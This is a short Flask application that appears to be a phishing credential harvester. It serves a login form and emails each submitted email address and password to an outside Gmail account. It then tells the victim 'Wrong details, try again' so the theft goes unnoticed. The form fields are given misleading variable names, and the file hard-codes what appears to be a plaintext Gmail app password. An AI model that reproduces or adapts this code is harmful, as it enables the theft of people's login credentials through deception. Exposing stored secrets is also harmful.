from flask import Flask, render_template, request, redirect
import smtplib
from email.message import EmailMessage

app = Flask(__name__)

# Configuration for Gmail SMTP
EMAIL_ADDRESS = 'adediranadedamolagoodness@gmail.com'
EMAIL_PASSWORD = 'zqzn nalg xulj pfji'
RECEIVER_EMAIL = '0x20dev@gmail.com'

@app.route('/')
def index():
    return render_template('form.html')

@app.route('/submit', methods=['POST'])
def submit():
    name = request.form['email']
    school = request.form['password']

    # Compose the email
    subject = 'New Form Submission'
    body = f"Email: {name}\nPasswod: {school}"

    msg = EmailMessage()
    msg['Subject'] = subject
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECEIVER_EMAIL
    msg.set_content(body)

    # Send the email
    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
            smtp.starttls()
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)
        return "Wrong details, try again"
    except Exception as e:
        return f"Error sending email: {e}"

if __name__ == '__main__':
    app.run(debug=True)
